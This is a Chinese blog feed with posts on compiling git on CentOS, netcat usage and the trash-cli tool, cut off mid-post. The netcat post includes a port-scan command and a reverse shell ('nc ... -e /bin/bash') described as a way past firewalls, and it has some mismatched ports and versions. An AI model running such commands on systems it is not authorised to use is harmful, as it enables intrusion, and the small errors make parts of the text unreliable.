  <entry>
    <title>CentOS Install git Source</title>
    <link href="https://jiemin.wang/2019/03/25/git-install/"/>
    <id>https://jiemin.wang/2019/03/25/git-install/</id>
    <published>2019-03-25T05:07:08.000Z</published>
    <updated>2019-03-25T05:48:46.687Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://git-scm.com" target="_blank" rel="noopener">Git</a></p><p>同生活中的许多伟大事件一样，Git 诞生于一个极富纷争大举创新的年代。Linux 内核开源项目有着为数众广的参与者。绝大多数的 Linux 内核维护工作都花在了提交补丁和保存归档的繁琐事务上（1991－2002年间）。到 2002 年，整个项目组开始启用分布式版本控制系统 BitKeeper 来管理和维护代码。<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">官方文档</a></p><p>到了 2005 年，开发 BitKeeper 的商业公司同 Linux 内核开源社区的合作关系结束，他们收回了免费使用 BitKeeper 的权力。这就迫使 Linux 开源社区（特别是 Linux 的缔造者 Linus Torvalds ）不得不吸取教训，只有开发一套属于自己的版本控制系统才不至于重蹈覆辙。他们对新的系统制订了若干目标：</p><ul><li>速度</li><li>简单的设计</li><li>对非线性开发模式的强力支持（允许上千个并行开发的分支）</li><li>完全分布式</li><li>有能力高效管理类似 Linux 内核一样的超大规模项目（速度和数据量）</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>git 源码安装。<a href="https://github.com/git/git/archive/v2.21.0.zip" target="_blank" rel="noopener">下载源码</a><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wget https://github.com/git/git/archive/v2.21.0.zip</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>解压缩<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tar zxvf v2.21.0.zip</span></span><br><span class="line"><span class="comment"># cd git-2.20.1</span></span><br><span class="line"></span><br><span class="line">编译命令如下</span><br><span class="line"><span class="comment"># # make prefix=/usr/local/git all</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>如果遇到该错误</p><img src="/2019/03/25/git-install/giterror.jpg" title="giterror"><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.h:6:23: warning: curl/curl.h: No such file or directory</span><br><span class="line">http.h:7:23: warning: curl/easy.h: No such file or directory</span><br><span class="line">……</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line"><span class="comment"># yum install -y curl curl-devel</span></span><br></pre></td></tr></tbody></table></figure><p>重新执行编译命令</p><p>发现编译报错</p><img src="/2019/03/25/git-install/giterror2.jpg" title="giterror2"><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    CC http.o</span><br><span class="line">    CC http-walker.o</span><br><span class="line">    CC http-fetch.o</span><br><span class="line">    LINK git-http-fetch</span><br><span class="line">    CC http-push.o</span><br><span class="line">http-push.c:22:19: warning: expat.h: No such file or directory</span><br><span class="line">http-push.c:830: warning: <span class="built_in">type</span> defaults to ‘int’ <span class="keyword">in</span> declaration of ‘XML_Char’</span><br><span class="line">http-push.c:830: error: expected ‘;’, ‘,’ or ‘)’ before ‘*’ token</span><br><span class="line">http-push.c: In <span class="keyword">function</span> ‘lock_remote’:</span><br><span class="line">http-push.c:900: error: ‘XML_Parser’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:900: error: (Each undeclared identifier is reported only once</span><br><span class="line">http-push.c:900: error: <span class="keyword">for</span> each <span class="keyword">function</span> it appears <span class="keyword">in</span>.)</span><br><span class="line">http-push.c:900: error: expected ‘;’ before ‘parser’</span><br><span class="line">http-push.c:907: warning: implicit declaration of <span class="keyword">function</span> ‘XML_SetUserData’</span><br><span class="line">http-push.c:907: error: ‘parser’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:908: warning: implicit declaration of <span class="keyword">function</span> ‘XML_SetElementHandler’</span><br><span class="line">http-push.c:910: warning: implicit declaration of <span class="keyword">function</span> ‘XML_SetCharacterDataHandler’</span><br><span class="line">http-push.c:910: error: ‘xml_cdata’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:911: warning: implicit declaration of <span class="keyword">function</span> ‘XML_Parse’</span><br><span class="line">http-push.c:916: warning: implicit declaration of <span class="keyword">function</span> ‘XML_ErrorString’</span><br><span class="line">http-push.c:917: warning: implicit declaration of <span class="keyword">function</span> ‘XML_GetErrorCode’</span><br><span class="line">http-push.c:920: warning: implicit declaration of <span class="keyword">function</span> ‘XML_ParserFree’</span><br><span class="line">http-push.c: In <span class="keyword">function</span> ‘remote_ls’:</span><br><span class="line">http-push.c:1154: error: ‘XML_Parser’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:1154: error: expected ‘;’ before ‘parser’</span><br><span class="line">http-push.c:1161: error: ‘parser’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:1164: error: ‘xml_cdata’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c: In <span class="keyword">function</span> ‘locking_available’:</span><br><span class="line">http-push.c:1228: error: ‘XML_Parser’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:1228: error: expected ‘;’ before ‘parser’</span><br><span class="line">http-push.c:1235: error: ‘parser’ undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">make: *** [http-push.o] Error 1</span><br></pre></td></tr></tbody></table></figure><p>执行命令解决这个问题<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install -y expat-devel</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>再次重新执行编译命令</p><p>发现再次报错</p><img src="/2019/03/25/git-install/giterror3.jpg" title="giterror3"><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GITGUI_VERSION = 0.21.GITGUI</span><br><span class="line">    * new locations or Tcl/Tk interpreter</span><br><span class="line">    GEN git-gui</span><br><span class="line">    INDEX lib/</span><br><span class="line">    * tclsh failed; using unoptimized loading</span><br><span class="line">    MSGFMT    po/bg.msg make[1]: *** [po/bg.msg] Error 127</span><br><span class="line">make: *** [all] Error 2</span><br></pre></td></tr></tbody></table></figure><p>执行命令解决<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install -y tcl build-essential tk gettext</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>再次重新执行编译命令</p><p>git源码编译成功执行执行命令<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make prefix=/usr/local/git install</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /usr/local/git/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bin  libexec  share</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cd bin/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">git  git-cvsserver  gitk  git-receive-pack  git-shell  git-upload-archive  git-upload-pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ./git --version</span></span><br><span class="line">git version 2.20.1</span><br></pre></td></tr></tbody></table></figure><p>安装完成。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://git-scm.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Git&lt;/a&gt;&lt;/
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux Netcat 命令 - 网络中的瑞士军刀</title>
    <link href="https://jiemin.wang/2019/03/25/nc/"/>
    <id>https://jiemin.wang/2019/03/25/nc/</id>
    <published>2019-03-25T01:45:29.000Z</published>
    <updated>2019-04-18T01:54:29.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="http://netcat.sourceforge.net/" target="_blank" rel="noopener">netcat</a>是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用netcat命令所能完成的事情令人惊讶。它的<a href="http://netcat.sourceforge.net/download.php" target="_blank" rel="noopener">下载地址</a></p><p>netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ nc -h</span><br><span class="line">usage: nc [-46DdhklnrStUuvzC] [-i interval] [-p source_port]</span><br><span class="line">          [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_version]</span><br><span class="line">          [-x proxy_address[:port]] [hostname] [port[s]]</span><br><span class="line">        Command Summary:</span><br><span class="line">                -4              Use IPv4</span><br><span class="line">                -6              Use IPv6</span><br><span class="line">                -D              Enable the debug socket option</span><br><span class="line">                -d              Detach from stdin</span><br><span class="line">                -h              This <span class="built_in">help</span> text</span><br><span class="line">                -i secs         Delay interval <span class="keyword">for</span> lines sent, ports scanned</span><br><span class="line">                -k              Keep inbound sockets open <span class="keyword">for</span> multiple connects</span><br><span class="line">                -l              Listen mode, <span class="keyword">for</span> inbound connects</span><br><span class="line">                -n              Suppress name/port resolutions</span><br><span class="line">                -p port         Specify <span class="built_in">local</span> port <span class="keyword">for</span> remote connects</span><br><span class="line">                -r              Randomize remote ports</span><br><span class="line">                -S              Enable the TCP MD5 signature option</span><br><span class="line">                -s addr         Local <span class="built_in">source</span> address</span><br><span class="line">                -T ToS          Set IP Type of Service</span><br><span class="line">                -C              Send CRLF as line-ending</span><br><span class="line">                -t              Answer TELNET negotiation</span><br><span class="line">                -U              Use UNIX domain socket</span><br><span class="line">                -u              UDP mode</span><br><span class="line">                -v              Verbose</span><br><span class="line">                -w secs         Timeout <span class="keyword">for</span> connects and final net reads</span><br><span class="line">                -X proto        Proxy protocol: <span class="string">"4"</span>, <span class="string">"5"</span> (SOCKS) or <span class="string">"connect"</span></span><br><span class="line">                -x addr[:port]  Specify proxy address and port</span><br><span class="line">                -z              Zero-I/O mode [used <span class="keyword">for</span> scanning]</span><br><span class="line">        Port numbers can be individual or ranges: lo-hi [inclusive]</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nc</span><br><span class="line">usage: nc [-46DdhklnrStUuvzC] [-i interval] [-p source_port]</span><br><span class="line">          [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_version]</span><br><span class="line">          [-x proxy_address[:port]] [hostname] [port[s]]</span><br></pre></td></tr></tbody></table></figure><p>nc 的基本功能如下：</p><ul><li>telnet / 获取系统 banner 信息</li><li>传输文本信息</li><li>传输文件和目录</li><li>加密传输文件</li><li>端口扫描</li><li>远程控制 / 正方向 shell</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h2><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -z -v -n 192.168.10.10 10-100</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.</p><ul><li>z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换</li><li>v 参数指使用冗余选项（译者注：即详细输出）</li><li>n 参数告诉netcat 不要使用DNS反向查询IP地址的域名</li></ul><p>这个命令会打印21到25 所有开放的端口。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。</p><p>一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -v 192.168.10.10 22</span><br></pre></td></tr></tbody></table></figure><p>netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。</p><h4 id="C-S-Chat-Server-聊天"><a href="#C-S-Chat-Server-聊天" class="headerlink" title="C S(Chat Server) 聊天"></a>C S(Chat Server) 聊天</h4><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。</p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.10.10 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>不管你在机器B上键入什么都会出现在机器A上。</p><h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件testfile.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010 > testfile.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -n 192.168.10.10 10010 < testfile.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们创建了一个服务器在A上并且重定向netcat的输入为文件testfile.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。<br>在客户端我们重定向输出到testfile.txt，当B连接到A，A发送文件内容，B保存文件内容到testfile.txt.</p><p>没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。</p><h4 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h4><p>发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。</p><p>如果你想要通过网络传输一个目录从A到B。</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf - dir_name | nc -n 192.168.10.10 10010</span><br><span class="line">$ tar -cvf - dir_name | nc 192.168.10.10 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010 | tar -xvf -</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。</p><p>在客户端我们下载该压缩包通过netcat 管道然后打开文件。</p><p>如果想要节省带宽传输压缩包，我们可以使用<strong>bzip2</strong>或者其他工具压缩。</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf - dir_name| bzip2 -z | nc -n 192.168.10.10 10010</span><br><span class="line">$ tar -cvf - dir_name| bzip2 -z | nc 192.168.10.10 10010</span><br><span class="line"><span class="comment">#使用 bzip2 压缩</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010 | bzip2 -d | tar -xvf -</span><br><span class="line"><span class="comment">#使用 bzip2 解压缩</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="加密通过网络发送的数据"><a href="#加密通过网络发送的数据" class="headerlink" title="加密通过网络发送的数据"></a>加密通过网络发送的数据</h4><p>如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如 <strong>mcrypt</strong> 的工具加密。</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc localhost 10010 | mcrypt -flush -bare -F -q -d -m ecb > testfile.txt</span><br><span class="line"><span class="comment">#使用mcrypt工具加密数据</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mcrypt -flush -bare -F -q -m ecb < testfile.txt | nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用mcrypt工具解密数据。</p><p>以上两个命令会提示需要密码，确保两端使用相同的密码。</p><p>这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。</p><h4 id="反向-SHELL"><a href="#反向-SHELL" class="headerlink" title="反向 SHELL"></a>反向 SHELL</h4><p>反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>在客户端，简单地告诉netcat在连接完成后，执行shell</p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.10.10 10010 -e /bin/bash</span><br></pre></td></tr></tbody></table></figure><p></p><p>现在，什么是反向shell的特别之处呢 </p><p>反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为192.168.10.10，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如10.1.1.10的shell，那么我会用反向外壳用于这一目的。 </p><h4 id="克隆设备"><a href="#克隆设备" class="headerlink" title="克隆设备"></a>克隆设备</h4><p>如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。</p><p>克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=/dev/sda | nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>在客户端，简单地告诉netcat在连接完成后，执行shell</p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -n 192.168.10.10 10010 | dd of=/dev/sda</span><br></pre></td></tr></tbody></table></figure><p></p><p>dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://netcat.sourceforge.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>防止 rm -rf 误删带来的灾难</title>
    <link href="https://jiemin.wang/2019/03/20/trash-cli/"/>
    <id>https://jiemin.wang/2019/03/20/trash-cli/</id>
    <published>2019-03-20T09:42:01.000Z</published>
    <updated>2019-03-20T10:04:37.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h4 id="搞过运维想过行业的淫们都有过rm之伤，造成血的教训。为了避免以后才出现类似的情况，强烈建议生产环境中千万不要使用rm-rf-这种操作，太危险了。为什么不学学Ubuntu-MacOS等系统有一个回收站，删除了可以去回收站里面找。经过折腾一番，终于找到了一个工具-trash-cli。"><a href="#搞过运维想过行业的淫们都有过rm之伤，造成血的教训。为了避免以后才出现类似的情况，强烈建议生产环境中千万不要使用rm-rf-这种操作，太危险了。为什么不学学Ubuntu-MacOS等系统有一个回收站，删除了可以去回收站里面找。经过折腾一番，终于找到了一个工具-trash-cli。" class="headerlink" title="搞过运维想过行业的淫们都有过rm之伤，造成血的教训。为了避免以后才出现类似的情况，强烈建议生产环境中千万不要使用rm -rf 这种操作，太危险了。为什么不学学Ubuntu/MacOS等系统有一个回收站，删除了可以去回收站里面找。经过折腾一番，终于找到了一个工具 trash-cli。"></a>搞过运维想过行业的淫们都有过rm之伤，造成血的教训。为了避免以后才出现类似的情况，强烈建议生产环境中千万不要使用rm -rf 这种操作，太危险了。为什么不学学Ubuntu/MacOS等系统有一个回收站，删除了可以去回收站里面找。经过折腾一番，终于找到了一个工具 trash-cli。</h4><h4 id="trash-cli是一个使用-python-开发的软件包，trash-cli-trashes记录原始路径，删除日期和权限的文件。它使用KDE，GNOME和XFCE使用的相同垃圾桶，但您可以从命令行（和脚本）调用它。包含"><a href="#trash-cli是一个使用-python-开发的软件包，trash-cli-trashes记录原始路径，删除日期和权限的文件。它使用KDE，GNOME和XFCE使用的相同垃圾桶，但您可以从命令行（和脚本）调用它。包含" class="headerlink" title="trash-cli是一个使用 python 开发的软件包，trash-cli trashes记录原始路径，删除日期和权限的文件。它使用KDE，GNOME和XFCE使用的相同垃圾桶，但您可以从命令行（和脚本）调用它。包含:"></a><a href="https://github.com/andreafrancia/trash-cli" target="_blank" rel="noopener">trash-cli</a>是一个使用 python 开发的软件包，trash-cli trashes记录原始路径，删除日期和权限的文件。它使用KDE，GNOME和XFCE使用的相同垃圾桶，但您可以从命令行（和脚本）调用它。包含:</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* trash-put           trash files and directories.</span><br><span class="line">* trash-empty         empty the trashcan(s).</span><br><span class="line">* trash-list          list trashed files.</span><br><span class="line">* trash-restore       restore a trashed file.</span><br><span class="line">* trash-rm            remove individual files from the trashcan.</span><br></pre></td></tr></tbody></table></figure><h2 id="trash-cli-安装"><a href="#trash-cli-安装" class="headerlink" title="trash-cli 安装"></a>trash-cli 安装</h2><h4 id="The-easy-way"><a href="#The-easy-way" class="headerlink" title="The easy way"></a>The easy way</h4><h5 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements:"></a>Requirements:</h5><blockquote><p>Python 2.7 or Python 3<br>  setuptools (use apt-get install python-setuptools on Debian)</p></blockquote><p>Installation command:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy_install trash-cli</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="From-sources"><a href="#From-sources" class="headerlink" title="From sources"></a>From sources</h4><h5 id="System-wide-installation"><a href="#System-wide-installation" class="headerlink" title="System-wide installation:"></a>System-wide installation:</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/andreafrancia/trash-cli.git</span><br><span class="line"><span class="built_in">cd</span> trash-cli</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></tbody></table></figure><h5 id="User-only-installation"><a href="#User-only-installation" class="headerlink" title="User-only installation:"></a>User-only installation:</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/andreafrancia/trash-cli.git</span><br><span class="line"><span class="built_in">cd</span> trash-cli</span><br><span class="line">python setup.py install --user</span><br></pre></td></tr></tbody></table></figure><h2 id="trash-cli-命令"><a href="#trash-cli-命令" class="headerlink" title="trash-cli 命令"></a>trash-cli 命令</h2><h4 id="查看安装成功之后的命令"><a href="#查看安装成功之后的命令" class="headerlink" title="查看安装成功之后的命令"></a>查看安装成功之后的命令</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ll /usr/bin/ | grep trash</span></span><br><span class="line">-rwxr-xr-x    1 root root         123 Feb  2 17:43 trash</span><br><span class="line">-rwxr-xr-x    1 root root         125 Feb  2 17:43 trash-empty</span><br><span class="line">-rwxr-xr-x    1 root root         124 Feb  2 17:43 trash-list</span><br><span class="line">-rwxr-xr-x    1 root root         123 Feb  2 17:43 trash-put</span><br><span class="line">-rwxr-xr-x    1 root root         127 Feb  2 17:43 trash-restore</span><br><span class="line">-rwxr-xr-x    1 root root         122 Feb  2 17:43 trash-rm</span><br></pre></td></tr></tbody></table></figure><h6 id="功能说明："><a href="#功能说明：" class="headerlink" 